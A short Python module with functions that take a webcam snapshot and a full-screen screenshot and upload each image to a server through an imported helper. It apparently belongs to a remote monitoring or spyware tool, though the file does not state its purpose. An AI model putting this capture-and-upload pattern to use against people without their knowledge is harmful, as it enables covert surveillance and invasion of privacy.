from VideoCapture import Device
from PIL import ImageGrab
import os
from uploadFile import uploadFileToServer

def CameraShot():
    cam = Device()
    cam.saveSnapshot('camerashot.jpg')
    uploadFileToServer('camerashot.jpg')

def ScreenShot():
    snapshot = ImageGrab.grab()
    # save_path = os.path.expanduser("~/Desktop/pic.jpg")
    # snapshot.save(save_path)
    snapshot.save("screenshot.jpg")
    uploadFileToServer('screenshot.jpg')